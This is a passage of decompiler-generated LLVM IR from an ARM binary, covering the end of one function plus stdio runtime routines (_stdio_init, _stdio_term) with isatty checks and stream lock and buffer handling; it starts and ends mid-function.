  store i1 %v3_158a485, i1* %cpsr_c.global-to-local, align 1
  %v9_158a491 = icmp eq i32 %v2_158a083, %v2_15894
  br i1 %v9_158a491, label %dec_label_pc_158ac, label %dec_label_pc_158c4

dec_label_pc_158ac:                               ; preds = %dec_label_pc_15894, %dec_label_pc_158ac.dec_label_pc_158a0_crit_edge
  %v0_158ac92 = phi i32 [ %v1_158a4.pre, %dec_label_pc_158ac.dec_label_pc_158a0_crit_edge ], [ %v2_15894, %dec_label_pc_15894 ]
  store i32 %v0_158ac92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_158bc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_158bc, label %dec_label_pc_158c0, label %dec_label_pc_158ac.dec_label_pc_158a0_crit_edge

dec_label_pc_158ac.dec_label_pc_158a0_crit_edge:  ; preds = %dec_label_pc_158ac
  %v0_158a0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_158a4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_158a0 = inttoptr i32 %v0_158a0.pre to i32*
  %v2_158a0 = load i32, i32* %v1_158a0, align 4
  store i32 %v2_158a0, i32* %r3.global-to-local, align 4
  %v3_158a4 = icmp uge i32 %v2_158a0, %v1_158a4.pre
  store i1 %v3_158a4, i1* %cpsr_c.global-to-local, align 1
  %v9_158a4 = icmp eq i32 %v2_158a0, %v1_158a4.pre
  br i1 %v9_158a4, label %dec_label_pc_158ac, label %dec_label_pc_158c4

dec_label_pc_158c0:                               ; preds = %dec_label_pc_158ac
  %v0_158c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_158c0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_158c4

dec_label_pc_158c4:                               ; preds = %dec_label_pc_15894, %dec_label_pc_158ac.dec_label_pc_158a0_crit_edge, %dec_label_pc_158c0
  %v0_158cc = phi i32 [ %v0_158c0, %dec_label_pc_158c0 ], [ %v2_158a083, %dec_label_pc_15894 ], [ %v2_158a0, %dec_label_pc_158ac.dec_label_pc_158a0_crit_edge ]
  %v1_158c4 = phi i32 [ %v0_158c0, %dec_label_pc_158c0 ], [ %v2_15894, %dec_label_pc_15894 ], [ %v1_158a4.pre, %dec_label_pc_158ac.dec_label_pc_158a0_crit_edge ]
  %v3_158c4 = icmp uge i32 %v0_158cc, %v1_158c4
  store i1 %v3_158c4, i1* %cpsr_c.global-to-local, align 1
  %v9_158c4 = icmp eq i32 %v0_158cc, %v1_158c4
  br i1 %v9_158c4, label %dec_label_pc_158cc, label %dec_label_pc_158c4.dec_label_pc_15894_crit_edge

dec_label_pc_158c4.dec_label_pc_15894_crit_edge:  ; preds = %dec_label_pc_158c4
  %v0_15894.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15894

dec_label_pc_158cc:                               ; preds = %dec_label_pc_158c4
  %v2_158cc = icmp ne i32 %v1_158c4, 0
  store i1 %v2_158cc, i1* %cpsr_c.global-to-local, align 1
  %v7_158d0 = icmp slt i32 %v1_158c4, 2
  br i1 %v7_158d0, label %dec_label_pc_158ec, label %dec_label_pc_158d4

dec_label_pc_158d4:                               ; preds = %dec_label_pc_158cc
  %v0_158d4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_158d4, i32* %r0.global-to-local, align 4
  %v0_158d8 = load i32, i32* @r1, align 4
  %v1_158d8 = add i32 %v0_158d8, 129
  store i32 %v1_158d8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_158ec

dec_label_pc_158ec:                               ; preds = %dec_label_pc_15850, %dec_label_pc_158d4, %dec_label_pc_158cc
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_158f0 = load i32, i32* @r8, align 4
  %v2_158f0 = add i32 %v0_158f0, 160
  %v3_158f0 = inttoptr i32 %v2_158f0 to i32*
  %v4_158f0 = load i32, i32* %v3_158f0, align 4
  store i32 %v4_158f0, i32* %r0.global-to-local, align 4
  %v1_158f4 = add i32 %v4_158f0, 4
  %v2_158f4 = inttoptr i32 %v1_158f4 to i32*
  %v3_158f4 = load i32, i32* %v2_158f4, align 4
  %v1_158f8 = add i32 %v3_158f4, -1
  store i32 %v1_158f8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_158fc = icmp eq i32 %v1_158f8, 0
  store i32 %v1_158f8, i32* %v2_158f4, align 4
  br i1 %v2_158fc, label %dec_label_pc_15908, label %dec_label_pc_15970

dec_label_pc_15908:                               ; preds = %dec_label_pc_158ec
  %v0_15908 = load i32, i32* %r3.global-to-local, align 4
  %v1_15908 = load i32, i32* %r0.global-to-local, align 4
  %v2_15908 = add i32 %v1_15908, 8
  %v3_15908 = inttoptr i32 %v2_15908 to i32*
  store i32 %v0_15908, i32* %v3_15908, align 4
  %v0_1590c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1590c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15910

dec_label_pc_15910:                               ; preds = %dec_label_pc_15940.dec_label_pc_15910_crit_edge, %dec_label_pc_15908
  %v0_15910 = phi i32 [ %v0_15910.pre, %dec_label_pc_15940.dec_label_pc_15910_crit_edge ], [ %v0_1590c, %dec_label_pc_15908 ]
  %v1_15910 = inttoptr i32 %v0_15910 to i32*
  %v2_15910 = load i32, i32* %v1_15910, align 4
  store i32 %v2_15910, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_15910, i32* %r2.global-to-local, align 4
  %v2_1591c71 = load i32, i32* %v1_15910, align 4
  store i32 %v2_1591c71, i32* %r3.global-to-local, align 4
  %v3_1592073 = icmp uge i32 %v2_1591c71, %v2_15910
  store i1 %v3_1592073, i1* %cpsr_c.global-to-local, align 1
  %v9_1592079 = icmp eq i32 %v2_1591c71, %v2_15910
  br i1 %v9_1592079, label %dec_label_pc_15928, label %dec_label_pc_15940

dec_label_pc_15928:                               ; preds = %dec_label_pc_15910, %dec_label_pc_15928.dec_label_pc_1591c_crit_edge
  %v0_1592880 = phi i32 [ %v1_15920.pre, %dec_label_pc_15928.dec_label_pc_1591c_crit_edge ], [ %v2_15910, %dec_label_pc_15910 ]
  store i32 %v0_1592880, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15938 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15938, label %dec_label_pc_1593c, label %dec_label_pc_15928.dec_label_pc_1591c_crit_edge

dec_label_pc_15928.dec_label_pc_1591c_crit_edge:  ; preds = %dec_label_pc_15928
  %v0_1591c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15920.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1591c = inttoptr i32 %v0_1591c.pre to i32*
  %v2_1591c = load i32, i32* %v1_1591c, align 4
  store i32 %v2_1591c, i32* %r3.global-to-local, align 4
  %v3_15920 = icmp uge i32 %v2_1591c, %v1_15920.pre
  store i1 %v3_15920, i1* %cpsr_c.global-to-local, align 1
  %v9_15920 = icmp eq i32 %v2_1591c, %v1_15920.pre
  br i1 %v9_15920, label %dec_label_pc_15928, label %dec_label_pc_15940

dec_label_pc_1593c:                               ; preds = %dec_label_pc_15928
  %v0_1593c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1593c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15940

dec_label_pc_15940:                               ; preds = %dec_label_pc_15910, %dec_label_pc_15928.dec_label_pc_1591c_crit_edge, %dec_label_pc_1593c
  %v0_15948 = phi i32 [ %v0_1593c, %dec_label_pc_1593c ], [ %v2_1591c71, %dec_label_pc_15910 ], [ %v2_1591c, %dec_label_pc_15928.dec_label_pc_1591c_crit_edge ]
  %v1_15940 = phi i32 [ %v0_1593c, %dec_label_pc_1593c ], [ %v2_15910, %dec_label_pc_15910 ], [ %v1_15920.pre, %dec_label_pc_15928.dec_label_pc_1591c_crit_edge ]
  %v3_15940 = icmp uge i32 %v0_15948, %v1_15940
  store i1 %v3_15940, i1* %cpsr_c.global-to-local, align 1
  %v9_15940 = icmp eq i32 %v0_15948, %v1_15940
  br i1 %v9_15940, label %dec_label_pc_15948, label %dec_label_pc_15940.dec_label_pc_15910_crit_edge

dec_label_pc_15940.dec_label_pc_15910_crit_edge:  ; preds = %dec_label_pc_15940
  %v0_15910.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15910

dec_label_pc_15948:                               ; preds = %dec_label_pc_15940
  %v2_15948 = icmp ne i32 %v1_15940, 0
  store i1 %v2_15948, i1* %cpsr_c.global-to-local, align 1
  %v7_1594c = icmp slt i32 %v1_15940, 2
  br i1 %v7_1594c, label %dec_label_pc_15970, label %dec_label_pc_15950

dec_label_pc_15950:                               ; preds = %dec_label_pc_15948
  %v0_15950 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15950, i32* %r0.global-to-local, align 4
  %v0_15954 = load i32, i32* @r1, align 4
  %v1_15954 = add i32 %v0_15954, 129
  store i32 %v1_15954, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15970

dec_label_pc_1596c:                               ; preds = %dec_label_pc_155b0, %dec_label_pc_15594, %dec_label_pc_155bc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_15970

dec_label_pc_15970:                               ; preds = %dec_label_pc_158ec, %dec_label_pc_15948, %bb57, %dec_label_pc_155f4, %dec_label_pc_15950, %dec_label_pc_1596c
  %v0_15970 = load i32, i32* @r5, align 4
  store i32 %v0_15970, i32* %r0.global-to-local, align 4
  %v2_15978 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15978, i32* %r4.global-to-local, align 4
  store i32 %v6_15554, i32* @r5, align 4
  store i32 %v9_15554, i32* @r6, align 4
  store i32 %v12_15554, i32* @r7, align 4
  store i32 %v15_15554, i32* @r8, align 4
  ret i32 %v0_15970

; uselistorder directives
  uselistorder i32 %v0_1593c, { 1, 0, 2 }
  uselistorder i32 %v1_15920.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15910, { 1, 0 }
  uselistorder i32 %v0_158c0, { 1, 0, 2 }
  uselistorder i32 %v1_158a4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15894, { 1, 0 }
  uselistorder i32 %v0_1583c, { 1, 0, 2 }
  uselistorder i32 %v1_15820.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_157d4, { 1, 0, 2 }
  uselistorder i32 %v1_157b8, { 0, 2, 1 }
  uselistorder i32 %v4_15794, { 2, 1, 0, 3 }
  uselistorder i32 %v1_15744.pre, { 2, 1, 0 }
  uselistorder i32 %v0_156c8, { 1, 2, 0 }
  uselistorder i32 %v1_15658, { 1, 0 }
  uselistorder i32 %v0_15658, { 1, 0 }
  uselistorder i32 %v1_15640, { 1, 2, 0, 3 }
  uselistorder i32 %v1_155e4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 51, 5, 6, 7, 8, 9, 11, 10, 52, 13, 12, 14, 15, 16, 17, 18, 19, 21, 20, 53, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 50 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 25, 22, 23, 24, 26, 27, 28 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 34, 35, 4, 5, 6, 8, 7, 0, 9, 10, 11, 36, 37, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 16384, { 66, 67, 0, 68, 36, 69, 37, 70, 38, 71, 39, 72, 40, 73, 41, 74, 18, 75, 17, 60, 3, 50, 34, 51, 4, 52, 35, 53, 5, 54, 6, 55, 7, 56, 8, 57, 9, 58, 10, 59, 33, 61, 11, 62, 12, 63, 13, 64, 14, 65, 42, 76, 15, 77, 16, 78, 79, 45, 80, 46, 81, 47, 82, 43, 83, 19, 84, 44, 85, 20, 86, 21, 87, 23, 88, 22, 89, 25, 90, 24, 91, 26, 92, 27, 93, 28, 94, 29, 95, 30, 96, 48, 97, 31, 1, 49, 98, 32, 2 }
  uselistorder i32 (i32, i32)* @__libc_open, { 8, 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 12, 0, 11, 8, 7, 10, 9, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 1024, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 ()* @malloc, { 43, 42, 41, 4, 3, 2, 0, 1, 24, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 27, 26, 25, 23, 22 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @free, { 10, 9, 5, 4, 3, 2, 1, 8, 7, 6, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_15970, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1596c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15940, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15928, { 1, 0 }
  uselistorder label %dec_label_pc_158ec, { 1, 2, 0 }
  uselistorder label %dec_label_pc_158c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_158ac, { 1, 0 }
  uselistorder label %dec_label_pc_15850, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_15840, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15828, { 1, 0 }
  uselistorder label %dec_label_pc_157e8, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_157d8, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15720, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_15688._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_15630, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_155cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15594, { 1, 2, 0 }
}

define i32 @function_15984(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15984:
  %v0_15984 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15984, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15984
  %v5_15984 = sdiv i32 %arg2, 16
  %v6_15984 = and i32 %v5_15984, %arg1
  %v5_15988 = sdiv i32 %arg2, 256
  %v6_15988 = and i32 %v6_15984, %v5_15988
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15984, %bb
  %v9_1598c = phi i32 [ %arg1, %dec_label_pc_15984 ], [ %v6_15988, %bb ]
  ret i32 %v9_1598c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_159bc = call i32 @__aeabi_read_tp()
  %v3_159c0 = load i16, i16* @global_var_21510.336, align 2
  %v4_159c0 = sext i16 %v3_159c0 to i32
  store i32 %v4_159c0, i32* @r3, align 4
  store i32 %v0_159bc, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_159cc = add i32 %v4_159c0, %v0_159bc
  %v3_159cc = inttoptr i32 %v2_159cc to i32*
  %v4_159cc = load i32, i32* %v3_159cc, align 4
  store i32 %v4_159cc, i32* @r6, align 4
  %v1_159d0 = call i32 @isatty(i32 0)
  %v2_159d8 = icmp eq i32 %v1_159d0, 0
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r4, align 4
  br i1 %v2_159d8, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_159e4 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 304) to i16*), align 4
  %v7_159e4 = zext i16 %v5_159e4 to i32
  %v2_159e8 = xor i32 %v7_159e4, 256
  store i32 %v2_159e8, i32* @r3, align 4
  %v2_159ec = trunc i32 %v2_159e8 to i16
  store i16 %v2_159ec, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 304) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_159f4 = call i32 @isatty(i32 1)
  %v2_159f8 = icmp eq i32 %v1_159f4, 0
  br i1 %v2_159f8, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_15a00 = load i32, i32* @r4, align 4
  %v2_15a04 = add i32 %v1_15a00, 372
  %v3_15a04 = inttoptr i32 %v2_15a04 to i16*
  %v4_15a04 = load i16, i16* %v3_15a04, align 2
  %v2_15a08 = xor i16 %v4_15a04, 256
  store i16 %v2_15a08, i16* %v3_15a04, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_15a14 = load i16, i16* @global_var_21510.336, align 2
  %v4_15a14 = sext i16 %v3_15a14 to i32
  %v0_15a18 = load i32, i32* @r6, align 4
  %v1_15a18 = load i32, i32* @r5, align 4
  %v3_15a18 = add i32 %v1_15a18, %v4_15a14
  %v4_15a18 = inttoptr i32 %v3_15a18 to i32*
  store i32 %v0_15a18, i32* %v4_15a18, align 4
  ret i32 %v1_159f4

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_15a34 = load i32, i32* @r4, align 4
  store i32 %v3_15a34, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 -33100), i32* %r3.global-to-local, align 4
  %v2_15a48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 -33100) to i32*), align 4
  store i32 %v2_15a48, i32* %r0.global-to-local, align 4
  %v5_15a48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 -33096) to i32*), align 4
  store i32 %v5_15a48, i32* %r1.global-to-local, align 4
  %v8_15a48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 -33092) to i32*), align 4
  %v2_15a50 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_15a50, i32* %r3.global-to-local, align 4
  store i32 %v2_15a48, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_15a5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 152) to i32*), align 4
  store i32 %v2_15a48, i32* %r0.global-to-local, align 4
  store i32 %v5_15a48, i32* %r1.global-to-local, align 4
  store i32 %v8_15a48, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 -33112), i32* %r3.global-to-local, align 4
  %v1_15a6c = inttoptr i32 %v4_15a5c to i32*
  store i32 %v2_15a48, i32* %v1_15a6c, align 4
  %v3_15a6c = add i32 %v4_15a5c, 4
  %v4_15a6c = inttoptr i32 %v3_15a6c to i32*
  %v5_15a6c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15a6c, i32* %v4_15a6c, align 4
  %v6_15a6c = add i32 %v4_15a5c, 8
  %v7_15a6c = inttoptr i32 %v6_15a6c to i32*
  %v8_15a6c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_15a6c, i32* %v7_15a6c, align 4
  %v0_15a70 = load i32, i32* %r3.global-to-local, align 4
  %v1_15a70 = inttoptr i32 %v0_15a70 to i32*
  %v2_15a70 = load i32, i32* %v1_15a70, align 4
  store i32 %v2_15a70, i32* %r0.global-to-local, align 4
  %v3_15a70 = add i32 %v0_15a70, 4
  %v4_15a70 = inttoptr i32 %v3_15a70 to i32*
  %v5_15a70 = load i32, i32* %v4_15a70, align 4
  store i32 %v5_15a70, i32* %r1.global-to-local, align 4
  %v6_15a70 = add i32 %v0_15a70, 8
  %v7_15a70 = inttoptr i32 %v6_15a70 to i32*
  %v8_15a70 = load i32, i32* %v7_15a70, align 4
  %v2_15a74 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_15a74, i32* %r3.global-to-local, align 4
  store i32 %v2_15a70, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_15a80 = load i32, i32* %r7.global-to-local, align 4
  %v2_15a80 = add i32 %v0_15a80, 76
  %v3_15a80 = inttoptr i32 %v2_15a80 to i32*
  %v4_15a80 = load i32, i32* %v3_15a80, align 4
  store i32 %v4_15a80, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_15a88 = inttoptr i32 %v4_15a80 to i32*
  %v2_15a88 = load i32, i32* %v1_15a88, align 4
  store i32 %v2_15a88, i32* %r5.global-to-local, align 4
  %v2_15a8c = add i32 %v0_15a80, 160
  %v3_15a8c = inttoptr i32 %v2_15a8c to i32*
  %v4_15a8c = load i32, i32* %v3_15a8c, align 4
  store i32 %v2_15a70, i32* %r0.global-to-local, align 4
  store i32 %v5_15a70, i32* %r1.global-to-local, align 4
  store i32 %v8_15a70, i32* %r2.global-to-local, align 4
  store i32 -33124, i32* %r3.global-to-local, align 4
  %v2_15a9c = add i32 %v0_15a80, -33124
  store i32 %v2_15a9c, i32* %sl.global-to-local, align 4
  %v1_15aa0 = inttoptr i32 %v4_15a8c to i32*
  store i32 %v2_15a70, i32* %v1_15aa0, align 4
  %v3_15aa0 = add i32 %v4_15a8c, 4
  %v4_15aa0 = inttoptr i32 %v3_15aa0 to i32*
  %v5_15aa0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15aa0, i32* %v4_15aa0, align 4
  %v6_15aa0 = add i32 %v4_15a8c, 8
  %v7_15aa0 = inttoptr i32 %v6_15aa0 to i32*
  %v8_15aa0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_15aa0, i32* %v7_15aa0, align 4
  %v0_15b30.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15b3016 = icmp eq i32 %v0_15b30.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_15b3818 = add i32 %v0_15b30.pr, 56
  store i32 %v1_15b3818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_15b3016, label %dec_label_pc_15b44, label %dec_label_pc_15aa8

dec_label_pc_15aa8:                               ; preds = %entry, %.thread10
  %v0_15aa8 = phi i32 [ %v3_15b2c, %.thread10 ], [ %v0_15b30.pr, %entry ]
  %v1_15aa8 = add i32 %v0_15aa8, 64
  %v2_15aa8 = inttoptr i32 %v1_15aa8 to i32*
  %v3_15aa8 = load i32, i32* %v2_15aa8, align 4
  store i32 %v3_15aa8, i32* %r3.global-to-local, align 4
  %v0_15aac = call i32 @__aeabi_read_tp()
  store i32 %v0_15aac, i32* %r0.global-to-local, align 4
  %v1_15ab0 = add i32 %v0_15aac, -1168
  store i32 %v1_15ab0, i32* %r6.global-to-local, align 4
  %v3_15ab4 = icmp uge i32 %v3_15aa8, %v1_15ab0
  store i1 %v3_15ab4, i1* %cpsr_c.global-to-local, align 1
  %v9_15ab4 = icmp eq i32 %v3_15aa8, %v1_15ab0
  br i1 %v9_15ab4, label %.thread1, label %dec_label_pc_15ac8

.thread1:                                         ; preds = %dec_label_pc_15aa8
  %v1_15ab8 = load i32, i32* %r5.global-to-local, align 4
  %v2_15ab8 = add i32 %v1_15ab8, 60
  %v3_15ab8 = inttoptr i32 %v2_15ab8 to i32*
  %v4_15ab8 = load i32, i32* %v3_15ab8, align 4
  %v2_15abc = add i32 %v4_15ab8, 1
  store i32 %v2_15abc, i32* %r3.global-to-local, align 4
  store i32 %v2_15abc, i32* %v3_15ab8, align 4
  br label %.thread10

dec_label_pc_15ac8:                               ; preds = %dec_label_pc_15aa8, %dec_label_pc_15ad4
  %v0_15ac8 = load i32, i32* %r2.global-to-local, align 4
  %v1_15ac8 = inttoptr i32 %v0_15ac8 to i32*
  %v2_15ac8 = load i32, i32* %v1_15ac8, align 4
  store i32 %v2_15ac8, i32* %r3.global-to-local, align 4
  %v1_15acc = load i32, i32* %r4.global-to-local, align 4
  %v3_15acc = icmp uge i32 %v2_15ac8, %v1_15acc
  store i1 %v3_15acc, i1* %cpsr_c.global-to-local, align 1
  %v9_15acc = icmp eq i32 %v2_15ac8, %v1_15acc
  br i1 %v9_15acc, label %dec_label_pc_15ad4, label %dec_label_pc_15aec

dec_label_pc_15ad4:                               ; preds = %dec_label_pc_15ac8
  store i32 %v2_15ac8, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15ae4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15ae4, label %dec_label_pc_15ae8, label %dec_label_pc_15ac8

dec_label_pc_15ae8:                               ; preds = %dec_label_pc_15ad4
  %v0_15ae8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15ae8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15aec

dec_label_pc_15aec:                               ; preds = %dec_label_pc_15ac8, %dec_label_pc_15ae8
  %v0_15aec = phi i32 [ %v0_15ae8, %dec_label_pc_15ae8 ], [ %v2_15ac8, %dec_label_pc_15ac8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15aec = icmp eq i32 %v0_15aec, 0
  %v2_15af8.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_15aec, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_15aec
  %v1_15af8 = load i32, i32* %r6.global-to-local, align 4
  %v3_15af8 = add i32 %v2_15af8.pre, 64
  %v4_15af8 = inttoptr i32 %v3_15af8 to i32*
  store i32 %v1_15af8, i32* %v4_15af8, align 4
  %v1_15afc = load i32, i32* %r1.global-to-local, align 4
  %v2_15afc = load i32, i32* %r5.global-to-local, align 4
  %v3_15afc = add i32 %v2_15afc, 60
  %v4_15afc = inttoptr i32 %v3_15afc to i32*
  store i32 %v1_15afc, i32* %v4_15afc, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_15aec
  %v2_15af0 = add i32 %v2_15af8.pre, 8
  %v3_15af0 = inttoptr i32 %v2_15af0 to i32*
  %v4_15af0 = load i32, i32* %v3_15af0, align 4
  store i32 %v4_15af0, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_15b00 = add i32 %v2_15af8.pre, 20
  %v4_15b00 = inttoptr i32 %v3_15b00 to i32*
  store i32 %v4_15af0, i32* %v4_15b00, align 4
  %v1_15b04 = load i32, i32* %r2.global-to-local, align 4
  %v2_15b04 = trunc i32 %v1_15b04 to i16
  %v3_15b04 = load i32, i32* %r5.global-to-local, align 4
  %v4_15b04 = inttoptr i32 %v3_15b04 to i16*
  store i16 %v2_15b04, i16* %v4_15b04, align 2
  %v1_15b08 = load i32, i32* %r3.global-to-local, align 4
  %v2_15b08 = load i32, i32* %r5.global-to-local, align 4
  %v3_15b08 = add i32 %v2_15b08, 24
  %v4_15b08 = inttoptr i32 %v3_15b08 to i32*
  store i32 %v1_15b08, i32* %v4_15b08, align 4
  %v1_15b0c = load i32, i32* %r3.global-to-local, align 4
  %v2_15b0c = load i32, i32* %r5.global-to-local, align 4
  %v3_15b0c = add i32 %v2_15b0c, 28
  %v4_15b0c = inttoptr i32 %v3_15b0c to i32*
  store i32 %v1_15b0c, i32* %v4_15b0c, align 4
  %v1_15b10 = load i32, i32* %r3.global-to-local, align 4
  %v2_15b10 = load i32, i32* %r5.global-to-local, align 4
  %v3_15b10 = add i32 %v2_15b10, 16
  %v4_15b10 = inttoptr i32 %v3_15b10 to i32*
  store i32 %v1_15b10, i32* %v4_15b10, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_15b14 = load i32, i32* %sl.global-to-local, align 4
  %v1_15b14 = inttoptr i32 %v0_15b14 to i32*
  %v2_15b14 = load i32, i32* %v1_15b14, align 4
  store i32 %v2_15b14, i32* %r0.global-to-local, align 4
